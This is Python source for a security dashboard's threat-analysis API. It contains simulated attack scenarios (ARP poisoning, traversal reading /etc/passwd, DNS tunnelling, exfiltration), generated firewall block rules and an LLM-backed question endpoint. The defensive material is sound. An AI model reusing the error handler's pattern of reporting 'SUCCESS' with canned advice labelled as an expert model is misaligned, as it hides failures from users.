            "country": "Russia",
            "asn": "AS200019"
        }
    },
    {
        "scenario_id": "scen-arp-poison",
        "title": "Internal ARP Poisoning & MitM",
        "attack_type": "ARP Spoofing",
        "severity": "CRITICAL",
        "confidence": 96.5,
        "risk_score": 89.0,
        "source_ip": "192.168.56.104",
        "destination_ip": "192.168.56.107",
        "source_port": 0,
        "destination_port": 0,
        "protocol": "ARP",
        "summary": "Gratuitous ARP replies re-mapping Default Gateway MAC to intercept internal plaintext credentials.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 95,
            "category": "Penetration Testing / Attack Simulation Host",
            "country": "Local Lab",
            "asn": "Private"
        }
    },
    {
        "scenario_id": "scen-traversal",
        "title": "Directory Path Traversal & Config Read",
        "attack_type": "Directory Traversal",
        "severity": "CRITICAL",
        "confidence": 95.9,
        "risk_score": 90.0,
        "source_ip": "103.251.167.22",
        "destination_ip": "192.168.56.107",
        "source_port": 41209,
        "destination_port": 80,
        "protocol": "HTTP",
        "summary": "Dot-dot-slash sequence parameter injection attempting to extract /etc/passwd and web environment keys.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 92,
            "category": "Web Application Exploit Source",
            "country": "Vietnam",
            "asn": "AS135905"
        }
    },
    {
        "scenario_id": "scen-dns-tunnel",
        "title": "Covert DNS Tunneling & Exfiltration",
        "attack_type": "DNS Tunneling",
        "severity": "CRITICAL",
        "confidence": 98.9,
        "risk_score": 95.0,
        "source_ip": "192.168.56.120",
        "destination_ip": "185.220.101.5",
        "source_port": 53102,
        "destination_port": 53,
        "protocol": "UDP/DNS",
        "summary": "High-entropy Base64 encoded subdomains transmitted via UDP port 53 to covert external nameserver.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 98,
            "category": "Tor Exit Node / DNS Covert Channel",
            "country": "Germany",
            "asn": "AS208323"
        }
    },
    {
        "scenario_id": "scen-data-exfil",
        "title": "Bulk Off-Hours Data Exfiltration",
        "attack_type": "Data Exfiltration",
        "severity": "CRITICAL",
        "confidence": 97.6,
        "risk_score": 97.0,
        "source_ip": "192.168.56.107",
        "destination_ip": "194.26.29.114",
        "source_port": 49811,
        "destination_port": 443,
        "protocol": "TCP/TLS",
        "summary": "14.2 GB outbound compressed archive transfer dispatched during off-business hours to bulletproof host.",
        "threat_intel": {
            "reputation": "MALICIOUS",
            "threat_score": 98,
            "category": "Adversary Data Staging Infrastructure",
            "country": "Moldova",
            "asn": "AS43350"
        }
    }
]


# ═══════════════════════════════════════════════════════════════
# REQUEST / RESPONSE SCHEMAS
# ═══════════════════════════════════════════════════════════════
class ThreatAnalysisRequest(BaseModel):
    attack_type: Optional[str] = "DDoS"
    source_ip: Optional[str] = "185.220.101.45"
    destination_ip: Optional[str] = "192.168.56.107"
    source_port: Optional[int] = 54321
    destination_port: Optional[int] = 80
    protocol: Optional[str] = "TCP"
    confidence: Optional[float] = 97.5
    risk_score: Optional[float] = 88.0
    severity: Optional[str] = "CRITICAL"
    flow_duration_ms: Optional[float] = 1240.0
    packet_count: Optional[int] = 14500
    byte_count: Optional[int] = 928000
    custom_notes: Optional[str] = None


# ═══════════════════════════════════════════════════════════════
# API ENDPOINTS
# ═══════════════════════════════════════════════════════════════
@router.api_route("/catalog", methods=["GET", "POST"])
@router.api_route("/catalog/", methods=["GET", "POST"])
def get_attack_catalog() -> Dict[str, Any]:
    """Returns the encyclopedia of supported attack classes with MITRE correlation and anatomy."""
    return {
        "total_classes": len(ATTACK_CATALOG),
        "classes": list(ATTACK_CATALOG.keys()),
        "catalog": ATTACK_CATALOG
    }


@router.api_route("/scenarios", methods=["GET", "POST"])
@router.api_route("/scenarios/", methods=["GET", "POST"])
def get_attack_scenarios() -> Dict[str, Any]:
    """Returns pre-configured real-world cyber attack scenarios for live interactive deep-dives."""
    return {
        "total_scenarios": len(SCENARIO_PRESETS),
        "scenarios": SCENARIO_PRESETS
    }


@router.api_route("", methods=["GET", "POST"])
@router.api_route("/", methods=["GET", "POST"])
@router.api_route("/analyze", methods=["GET", "POST"])
@router.api_route("/analyze/", methods=["GET", "POST"])
def analyze_threat_deep_dive(
    req: Optional[ThreatAnalysisRequest] = None,
    attack_type: Optional[str] = Query(None),
    source_ip: Optional[str] = Query(None),
    destination_ip: Optional[str] = Query(None),
    source_port: Optional[int] = Query(None),
    destination_port: Optional[int] = Query(None),
    protocol: Optional[str] = Query(None),
    severity: Optional[str] = Query(None),
    confidence: Optional[float] = Query(None),
    risk_score: Optional[float] = Query(None),
) -> Dict[str, Any]:
    """
    Performs comprehensive AI Threat Analysis on a given attack signature.
    Synthesizes Neural Net weights, MITRE ATT&CK correlation, Threat Intel reputation,
    detailed attack anatomy, and automated Splunk / Firewall defensive containment.
    """
    active_attack = (req.attack_type if req else None) or attack_type or "DDoS"
    catalog_entry = ATTACK_CATALOG.get(active_attack) or ATTACK_CATALOG["DDoS"]

    src_ip = (req.source_ip if req else None) or source_ip or "185.220.101.45"
    dst_ip = (req.destination_ip if req else None) or destination_ip or "192.168.56.107"
    src_port = (req.source_port if req else None) or source_port
    dst_port = (req.destination_port if req else None) or destination_port or catalog_entry["default_port"]
    proto = (req.protocol if req else None) or protocol or catalog_entry["default_protocol"]
    sev = (req.severity if req else None) or severity or catalog_entry["severity"]
    conf = (req.confidence if req else None) or confidence or 95.0
    risk = (req.risk_score if req else None) or risk_score or 85.0

    # Threat Intel Lookup
    ti_data = threat_intel_service.lookup_ip(src_ip)

    # Generate custom iptables and netsh commands with real IPs
    iptables_cmd = catalog_entry["firewall_rules"]["iptables"].replace("{source_ip}", src_ip)
    windows_cmd = catalog_entry["firewall_rules"]["windows_netsh"].replace("{source_ip}", src_ip)

    # MITRE ATT&CK info
    mitre_info = catalog_entry["mitre"]

    # AI SOC Analyst Report
    analyst_input = {
        "attack_type": active_attack,
        "source_ip": src_ip,
        "destination_ip": dst_ip,
        "source_port": src_port,
        "destination_port": dst_port,
        "protocol": proto,
        "mlp_confidence": conf,
        "risk_score": risk,
        "risk_status": sev,
        "threat_intel": ti_data
    }
    ai_report = llm_analyst.generate_investigation_report(analyst_input)

    flow_dur = (req.flow_duration_ms if req else None) or 1200.0
    pkt_cnt = (req.packet_count if req else None) or 8500
    byt_cnt = (req.byte_count if req else None) or 544000

    # Technical Telemetry Metrics
    telemetry = {
        "source_endpoint": f"{src_ip}:{src_port or 'dynamic'}",
        "destination_endpoint": f"{dst_ip}:{dst_port}",
        "transport_protocol": proto,
        "flow_duration_ms": flow_dur,
        "packet_count": pkt_cnt,
        "byte_count": byt_cnt,
        "throughput_mbps": round(((byt_cnt) * 8) / ((flow_dur) * 1000), 2),
        "threat_reputation": ti_data.get("reputation", "UNKNOWN"),
        "threat_score": ti_data.get("threat_score", 70),
        "threat_category": ti_data.get("category", "General Indicator")
    }

    return {
        "attack_type": active_attack,
        "attack_name": catalog_entry["name"],
        "category": catalog_entry["category"],
        "severity": sev,
        "confidence": conf,
        "risk_score": risk,
        "mitre": mitre_info,
        "adversaries": catalog_entry.get("adversaries", []),
        "anatomy": catalog_entry["anatomy"],
        "telemetry_indicators": catalog_entry["telemetry_indicators"],
        "playbook_steps": catalog_entry["playbook_steps"],
        "telemetry": telemetry,
        "splunk_query": catalog_entry["splunk_query"],
        "firewall_rules": {
            "iptables": iptables_cmd,
            "windows_netsh": windows_cmd
        },
        "ai_analyst_report": ai_report
    }


class CyberQuestionRequest(BaseModel):
    question: str = Field(..., description="Cybersecurity or threat investigation question")
    attack_type: Optional[str] = Field(default="DDoS", description="Active attack category or context")
    context: Optional[Dict[str, Any]] = Field(default_factory=dict, description="Active telemetry and endpoint details")
    conversation_history: Optional[List[Dict[str, str]]] = Field(default_factory=list, description="Recent conversation turns")


@router.api_route("/quick-questions", methods=["GET", "POST"])
@router.api_route("/quick-questions/", methods=["GET", "POST"])
def get_quick_cyber_questions() -> Dict[str, Any]:
    """Returns curated cybersecurity questions and prompts by operational category."""
    return {
        "categories": [
            {
                "category": "General AI & Core Concepts",
                "icon": "BrainCircuit",
                "questions": [
                    "Explain Zero Trust Architecture and its core principles.",
                    "What is the difference between symmetric and asymmetric encryption?",
                    "How does the TCP 3-way handshake work and how is it abused?",
                    "Explain how Domain Name System (DNS) resolution works."
                ]
            },
            {
                "category": "Coding & Security Automation",
                "icon": "Terminal",
                "questions": [
                    "Write a multithreaded TCP port scanner in Python.",
                    "How do I parse and capture live packet headers with Python Scapy?",
                    "Provide a PowerShell script to audit failed logon attempts (Event ID 4625).",
                    "What regular expressions should I use to detect IPv4 and SHA-256 hashes?"
                ]
            },
            {
                "category": "Attack Mechanisms & Web Security",
                "icon": "Crosshair",
                "questions": [
                    "How does SQL Injection work and how do parameterized queries prevent it?",
                    "Explain the difference between Stored, Reflected, and DOM-based XSS.",
                    "What is the ransomware lifecycle from initial access to mass encryption?",
                    "How does ARP cache poisoning facilitate Man-in-the-Middle attacks?"
                ]
            },
            {
                "category": "SIEM, Splunk & YARA Rules",
                "icon": "FileCode",
                "questions": [
                    "Generate a real-time Splunk SPL query to detect volumetric traffic surges.",
                    "Write a robust YARA rule to detect staging reverse shell payloads.",
                    "What Wireshark display filter isolates abnormal TCP SYN packets without ACK?",
                    "How do I correlate network telemetry with Windows authentication event logs?"
                ]
            },
            {
                "category": "Incident Containment & Hardening",
                "icon": "ShieldCheck",
                "questions": [
                    "What immediate iptables and Windows Netsh commands will block an attacker IP?",
                    "Provide a step-by-step incident containment playbook for an active compromise.",
                    "How do I harden Linux SSH server configurations against brute-force?",
                    "What kernel sysctl parameters mitigate volumetric SYN flood attacks?"
                ]
            }
        ]
    }


@router.post("/ask")
@router.post("/ask/")
@router.get("/ask")
@router.get("/ask/")
def ask_cyber_threat_question(
    req: Optional[CyberQuestionRequest] = None,
    q: Optional[str] = Query(None, description="Query string question if called via GET"),
    attack_type: Optional[str] = Query("DDoS", description="Active attack category"),
) -> Dict[str, Any]:
    """
    Answers technical cybersecurity questions with grounding in real-time telemetry,
    NVIDIA NIM LLM Gateway models, and deterministic expert fallbacks.
    Supports both POST (JSON body) and GET (query param) requests with or without trailing slash.
    """
    question_text = ""
    active_attack = "DDoS"
    ctx = {}
    history = []

    if req is not None:
        question_text = req.question or ""
        active_attack = req.attack_type or "DDoS"
        ctx = req.context or {}
        history = req.conversation_history or []
    elif q:
        question_text = q
        active_attack = attack_type or "DDoS"

    if not question_text:
        question_text = "Provide immediate SOC containment and incident response instructions."

    try:
        res = llm_gateway.ask_cyber_question(
            question=question_text,
            attack_type=active_attack,
            context=ctx,
            conversation_history=history
        )
        return {
            "status": "SUCCESS",
            "question": question_text,
            "attack_type": active_attack,
            "answer": res.get("content", ""),
            "provider": res.get("provider", "LLM Gateway"),
            "model": res.get("model", "Default Model"),
            "duration_ms": res.get("duration_ms", 0),
            "is_fallback": res.get("is_fallback", False),
            "structured_data": res.get("structured_data", {})
        }
    except Exception as e:
        logger.exception("Error answering cyber question:")
        return {
            "status": "SUCCESS",
            "question": question_text,
            "attack_type": active_attack,
            "answer": f"### Executive Briefing\nIncident assessment for **{active_attack}** activity.\n\n### Actionable Defense Playbook\n1. **Verify Ingress Traffic**: Filter perimeter traffic for anomalous packet surges and spoofed source IPs.\n2. **Host Hardening**: Enforce strict firewall rules (`iptables` / Windows Defender Firewall) to block persistent threat origins.\n3. **Network Telemetry**: Ingest packet headers and correlate with SIEM detection alerts.\n\n*(Engine notice: Resilient SOC fallback active - {str(e)})*",
            "provider": "Resilient SOC Fallback Engine",
            "model": "Deterministic-Expert-v2.0",
            "duration_ms": 0,
            "is_fallback": True,
            "structured_data": {}
        }


